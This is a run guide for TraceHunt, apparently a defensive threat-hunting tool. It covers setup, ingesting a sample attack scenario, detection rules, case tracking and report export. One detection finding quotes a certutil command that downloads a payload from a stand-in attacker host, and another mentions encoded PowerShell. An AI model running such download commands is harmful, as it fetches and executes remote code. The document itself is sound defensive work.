# TraceHunt — Demonstration & Operational Run Guide

This guide provides step-by-step instructions for running, demonstrating, and evaluating **TraceHunt** on macOS, Linux, or Windows.

---

## 1. Prerequisites & Environment Setup

### 1.1 Python Version
Ensure Python 3.11+ is installed (TraceHunt is developed and validated on Python 3.14.3):
```bash
python3 --version
```

### 1.2 Dependencies Installation
From the project root directory (`/Users/sanyakumari/Desktop/Project`):
```bash
python3 -m pip install -r requirements.txt
```

### 1.3 Database Initialization
Initialize the local SQLite database schema and seed the default 5 behavioral detection rules:
```bash
python3 -c "from tracehunt.database import init_db; init_db()"
```
*Expected Output:*
`[INFO] Database schema initialized successfully at sqlite:///tracehunt.db`
`[INFO] Seeded 5 default detection rules into database.`

---

## 2. Starting the Application Services

TraceHunt consists of a **FastAPI backend** providing REST APIs and a **Streamlit analyst dashboard** providing the visual hunting UI.

### 2.1 Start the FastAPI REST API
In terminal 1:
```bash
python3 -m uvicorn tracehunt.api.app:app --host 127.0.0.1 --port 8000 --reload
```
- Open Swagger API Documentation: [http://127.0.0.1:8000/docs](http://127.0.0.1:8000/docs)
- Verify API Health: `curl http://127.0.0.1:8000/api/v1/health`

### 2.2 Start the Streamlit Analyst Dashboard
In terminal 2:
```bash
python3 -m streamlit run tracehunt/dashboard/app.py --server.port 8501
```
- Open the Dashboard: [http://127.0.0.1:8501](http://127.0.0.1:8501)

---

## 3. Step-by-Step Demonstration Workflow

Follow these 6 steps to demonstrate the end-to-end capabilities of TraceHunt:

### Step 1: Ingest Threat Telemetry
Load the pre-packaged attack scenario into the platform.

**Option A — Via Streamlit Dashboard:**
1. Navigate to the **"Telemetry Ingestion"** page in the left sidebar.
2. In the upload card, upload the file `fixtures/suspicious/attack_tree.json`.
3. Click **"Execute Ingestion"**.
4. Observe the summary metric cards: `5 Records Read`, `5 Normalized`, `0 Duplicates`, `0 Errors`.

**Option B — Via CLI / REST API:**
```bash
curl -X POST "http://127.0.0.1:8000/api/v1/ingest" \
     -H "accept: application/json" \
     -F "file=@fixtures/suspicious/attack_tree.json"
```

---

### Step 2: Explore Host Telemetry & Process Tree
Inspect the reconstructed process tree showing process lineage.

1. Navigate to the **"Host / Process Explorer"** page in the sidebar.
2. Select host **`VICTIM-HOST`** from the host dropdown.
3. Observe the hierarchical process execution tree:
   ```
   [PID 1000] C:\Windows\explorer.exe (User: CORP\victim)
     └── [PID 2000] C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
           └── [PID 3000] C:\Windows\System32\cmd.exe
                 └── [PID 4000] C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
                       └── [PID 5000] C:\Windows\System32\certutil.exe
   ```
4. Click on any node to view detailed process attributes: timestamp, command line, parent PID, and user identity.

---

### Step 3: Run the Behavioral Detection Engine
Execute behavioral threat-hunting rules against the ingested telemetry.

1. Navigate to the **"Host / Process Explorer"** page.
2. Click **"Run Detections for VICTIM-HOST"** (or use the API: `curl -X POST http://127.0.0.1:8000/api/v1/detections/evaluate`).
3. Observe the generated behavioral findings:
   - **Finding 1 (RULE-002-PROC-SPAWN - HIGH):** Office application `WINWORD.EXE` spawned command shell `cmd.exe`.
   - **Finding 2 (RULE-001-LOLBIN - HIGH):** `powershell.exe` executed with base64-encoded command flags (`-enc`).
   - **Finding 3 (RULE-001-LOLBIN - HIGH):** `certutil.exe` executed with download flags (`-urlcache -split -f http://evil.attacker.com/payload.exe`).
4. Click on a finding to review its **explainable rationale**, **matched fields**, and **operational caveats**.

---

### Step 4: Investigate Host Timeline
Review the unified chronological timeline of all host activities.

1. In the **"Host / Process Explorer"** page, switch to the **"Host Timeline"** tab.
2. Observe all 5 events sorted in chronological order with visual alert badges.
3. Use the filter controls to filter by:
   - Event Type: `PROCESS_CREATE`
   - Search Query: `certutil`
   - Severity: `HIGH`

---

### Step 5: Open an Investigation Case & Link Evidence
Track the threat-hunting investigation with an immutable analyst audit trail.

1. Navigate to the **"Investigation Cases"** page in the sidebar.
2. Click **"Create New Investigation Case"**:
   - **Title:** `Macro-based Initial Access on VICTIM-HOST`
   - **Host:** `VICTIM-HOST`
   - **Summary:** `Phishing invoice document executed macro, spawning cmd and downloading remote payload.`
   - **Lead Reviewer:** `analyst_jane`
3. Click **"Create Case"**.
4. In the case view, transition the case status:
   - Select **`INVESTIGATING`** $\rightarrow$ Click **"Update Status"**.
5. Attach the certutil finding as evidence:
   - Enter Finding ID: `3`
   - Notes: `Confirmed staging URL pointing to external adversary infrastructure.`
   - Click **"Attach Evidence"**.
6. Switch to the **"Audit History"** tab to view the complete immutable audit trail:
   - Record 1: `[CASE_CREATED]` by `analyst_jane`
   - Record 2: `[STATUS_CHANGED]` by `analyst_jane` (OPEN $\rightarrow$ INVESTIGATING)
   - Record 3: `[EVIDENCE_ATTACHED]` by `analyst_jane`

---

### Step 6: Export Investigation Reports
Generate reproducible threat-hunting reports.

1. Navigate to the **"Report Generation"** page in the sidebar.
2. Select Case ID: `INV-...` (or Target Host: `VICTIM-HOST`).
3. Select Format: **"Executive HTML Report"**.
4. Click **"Generate Report"**.
5. Click **"Download Generated Report"** to download the self-contained HTML file.
6. Open the downloaded `.html` file in your browser to view:
   - Executive metrics grid (analyzed events, total findings, severity distribution).
   - Case summary and disposition rationale.
   - Evidence registry with direct event references.
   - Full chronological execution timeline with XSS-safe code formatting.

---

## 4. Running Benchmarks & Accuracy Evaluation

### 4.1 Run Performance Benchmark Suite
Executes multi-batch throughput tests ($N=100$, $N=1,000$), deduplication speed, graph latency, and report generation time:
```bash
python3 scripts/benchmark_performance.py
```
*Results are saved to `reports/benchmark_results.json`.*

### 4.2 Run Detection Accuracy Evaluation
Calculates True Positives, False Positives, False Negatives, Precision, Recall, and F1 across all 5 rules using independent ground-truth fixtures:
```bash
python3 scripts/evaluate_detections.py
```
*Results are saved to `reports/detection_evaluation.json`.*

### 4.3 Run Automated End-to-End Verification
Executes the full 11-step lifecycle verification workflow on an isolated temporary database:
```bash
python3 scripts/verify_e2e_full.py
```

### 4.4 Run Full Pytest Test Suite
Runs all 114 unit, integration, and security tests:
```bash
python3 -m pytest -v
```

---

## 5. Cleaning Up Demonstration Data

To reset the database and clear generated reports:
```bash
# Remove SQLite database and WAL files
rm -f tracehunt.db tracehunt.db-shm tracehunt.db-wal

# Remove generated report artifacts
rm -rf reports/*.html reports/*.json

# Re-initialize clean schema and default rules
python3 -c "from tracehunt.database import init_db; init_db()"
```
